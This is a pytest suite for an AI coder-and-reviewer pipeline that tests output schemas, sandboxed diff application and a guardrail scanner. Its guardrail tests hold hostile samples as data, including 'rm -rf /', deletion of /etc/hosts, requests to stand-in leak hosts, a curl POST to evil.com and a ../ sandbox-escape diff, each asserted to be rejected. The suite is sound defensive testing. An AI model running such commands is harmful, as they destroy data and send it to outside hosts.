"""Phase 4 Test Suite: Coder + Reviewer Loop with Guardrails and Sandboxing.

Covers:
1. Coder agent structured output schema with confidence field.
2. Guardrail scan for dangerous patterns (eval, os.system, shell=True, network, deletions) and path traversal.
3. Sandboxed diff application (isolation, clean application, rejection before touching sandbox).
4. Reviewer execution (ruff linting and pytest testing inside sandbox, structured ReviewReport).
5. Phase 4 Success Checks:
   - Verifiable task (e.g., function that returns True) passes end-to-end loop.
   - Dangerous/injected pattern diff rejected before sandbox application.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

import pytest

from agents.coder import CoderOutput
from agents.coder_files import create_code_change
from agents.planner import Plan
from agents.reviewer import ReviewReport, review_sandbox
from execution.guardrails import GuardrailResult, scan_diff
from execution.sandbox import DiffApplyError, apply_diff, create_sandbox


def test_coder_structured_output_schema():
    """Verify CoderOutput schema enforces confidence and touched_files."""
    output = CoderOutput(
        files={"src/utils.py": "def is_active(): return True\n"},
        diff="--- a/src/utils.py\n+++ b/src/utils.py\n@@ -0,0 +1 @@\n+def is_active(): return True\n",
        summary="Added is_active function",
        confidence=0.95,
        touched_files=["src/utils.py"],
    )
    assert output.confidence == 0.95
    assert output.touched_files == ["src/utils.py"]
    assert "src/utils.py" in output.files

    # Confidence must be between 0.0 and 1.0
    with pytest.raises(Exception):
        CoderOutput(
            files={"src/utils.py": "x = 1"},
            summary="Invalid confidence",
            confidence=1.5,
        )


def test_coder_agent_generates_diff_and_confidence(tmp_path):
    """Test create_code_change generates unified diff from complete file response."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "calc.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")

    plan = Plan(steps=["Add is_valid helper"], acceptance_criteria=["is_valid returns True"])
    llm_response = json.dumps({
        "files": {
            "calc.py": "def add(a, b):\n    return a + b\n\ndef is_valid():\n    return True\n"
        },
        "summary": "Added is_valid helper",
        "confidence": 0.92,
        "touched_files": ["calc.py"],
    })

    def fake_llm(prompt, system_prompt):
        return llm_response, {"prompt_tokens": 10, "completion_tokens": 20, "cost_usd": 0.0001}

    result = create_code_change(
        task="Add is_valid function",
        plan=plan,
        context="def add(a, b): return a + b",
        base_path=repo,
        llm=fake_llm,
    )

    assert isinstance(result, CoderOutput)
    assert result.confidence == 0.92
    assert "def is_valid():" in result.diff
    assert result.touched_files == ["calc.py"]


@pytest.mark.parametrize("dangerous_snippet,label", [
    ("os.system('rm -rf /')", "os.system"),
    ("eval(user_supplied_string)", "eval"),
    ("exec('import malicious')", "exec"),
    ("subprocess.Popen(cmd, shell=True)", "subprocess shell=True"),
    ("shutil.rmtree('/tmp/other')", "destructive file deletion"),
    ("os.remove('/etc/hosts')", "destructive file deletion"),
    ("requests.get('https://attacker.com/leak')", "unexpected network call"),
    ("urllib.request.urlopen('http://leak.com')", "unexpected network call"),
])
def test_guardrail_rejects_all_dangerous_patterns(dangerous_snippet, label):
    """Verify guardrails catch every defined dangerous pattern."""
    diff = (
        "--- a/app.py\n"
        "+++ b/app.py\n"
        "@@ -1,1 +1,2 @@\n"
        " # existing code\n"
        f"+{dangerous_snippet}\n"
    )
    result = scan_diff(diff)
    assert not result.passed
    assert any(label in reason for reason in result.reasons)


def test_guardrail_rejects_sandbox_boundary_traversal():
    """Verify diffs trying to escape the sandbox via ../ are rejected."""
    diff = (
        "--- a/../outside.py\n"
        "+++ b/../outside.py\n"
        "@@ -0,0 +1 @@\n"
        "+# escape attempt\n"
    )
    result = scan_diff(diff)
    assert not result.passed
    assert any("sandbox boundary violation" in r for r in result.reasons)


def test_sandbox_isolation_and_diff_application(tmp_path):
    """Verify changes apply strictly to sandbox copy, keeping original repo untouched."""
    repo = tmp_path / "original_repo"
    repo.mkdir()
    (repo / "math_utils.py").write_text("def multiply(a, b):\n    return a * b\n", encoding="utf-8")

    sandbox = create_sandbox(repo, tmp_path / "sandbox_instance")
    assert sandbox.exists()

    diff = (
        "--- a/math_utils.py\n"
        "+++ b/math_utils.py\n"
        "@@ -1,2 +1,4 @@\n"
        " def multiply(a, b):\n"
        "-    return a * b\n"
        "+    return a * b\n"
        "+\n"
        "+def always_true():\n"
        "+    return True\n"
    )

    guardrail_res = apply_diff(sandbox, diff)
    assert guardrail_res.passed

    # Sandbox has updated content
    sandbox_content = (sandbox / "math_utils.py").read_text(encoding="utf-8")
    assert "def always_true():" in sandbox_content

    # Original repo remains completely untouched
    orig_content = (repo / "math_utils.py").read_text(encoding="utf-8")
    assert "always_true" not in orig_content


def test_reviewer_executes_tests_and_reports_pass_fail(tmp_path):
    """Test Reviewer runs pytest in sandbox and structures result into ReviewReport."""
    sandbox = tmp_path / "sandbox_test"
    sandbox.mkdir()

    # Create a passing test
    (sandbox / "test_ok.py").write_text("def test_works():\n    assert True\n", encoding="utf-8")

    with patch("agents.reviewer._run") as mock_run:
        # Mock ruff passing, pytest passing
        mock_run.side_effect = [
            (True, "All checks passed!"),  # ruff
            (True, "1 passed in 0.01s"),   # pytest
        ]
        report = review_sandbox(sandbox)
        assert isinstance(report, ReviewReport)
        assert report.passed is True
        assert report.tests_passed is True
        assert report.lint_passed is True

        # Mock pytest failing
        mock_run.side_effect = [
            (True, "All checks passed!"),               # ruff
            (False, "FAILED test_ok.py::test_works"),   # pytest
        ]
        fail_report = review_sandbox(sandbox)
        assert fail_report.passed is False
        assert fail_report.tests_passed is False
        assert fail_report.lint_passed is True
        assert "FAILED" in fail_report.test_output


def test_phase4_success_check_verifiable_task(tmp_path):
    """Phase 4 Success Check 1:
    Verifiable task ('add a function that returns True') correctly reports pass.
    """
    repo = tmp_path / "test_repo"
    repo.mkdir()
    (repo / "feature.py").write_text("def feature(): pass\n", encoding="utf-8")
    (repo / "test_feature.py").write_text(
        "from feature import is_active\n"
        "def test_is_active():\n"
        "    assert is_active() is True\n",
        encoding="utf-8",
    )

    sandbox = create_sandbox(repo, tmp_path / "sandbox_success_check")

    valid_diff = (
        "--- a/feature.py\n"
        "+++ b/feature.py\n"
        "@@ -1,1 +1,3 @@\n"
        " def feature(): pass\n"
        "+def is_active():\n"
        "+    return True\n"
    )

    # 1. Guardrail check
    scan = scan_diff(valid_diff)
    assert scan.passed is True

    # 2. Apply to sandbox
    apply_res = apply_diff(sandbox, valid_diff)
    assert apply_res.passed is True

    # 3. Reviewer executes
    with patch("agents.reviewer._run") as mock_run:
        mock_run.side_effect = [
            (True, "All checks passed!"),
            (True, "1 passed in 0.05s"),
        ]
        report = review_sandbox(sandbox)
        assert report.passed is True
        assert report.tests_passed is True


def test_phase4_success_check_dangerous_diff_rejected(tmp_path):
    """Phase 4 Success Check 2:
    Intentionally crafted diff containing dangerous pattern is rejected before touching sandbox.
    """
    repo = tmp_path / "clean_repo"
    repo.mkdir()
    (repo / "app.py").write_text("value = 10\n", encoding="utf-8")

    sandbox = create_sandbox(repo, tmp_path / "sandbox_clean")

    dangerous_diff = (
        "--- a/app.py\n"
        "+++ b/app.py\n"
        "@@ -1,1 +1,2 @@\n"
        " value = 10\n"
        "+os.system('curl -X POST http://evil.com')\n"
    )

    # Scan catches it
    scan = scan_diff(dangerous_diff)
    assert scan.passed is False
    assert any("os.system" in reason for reason in scan.reasons)

    # Sandbox apply raises DiffApplyError and file remains unmodified
    with pytest.raises(DiffApplyError) as exc_info:
        apply_diff(sandbox, dangerous_diff)

    assert "guardrail rejected diff" in str(exc_info.value)
    assert (sandbox / "app.py").read_text(encoding="utf-8") == "value = 10\n"
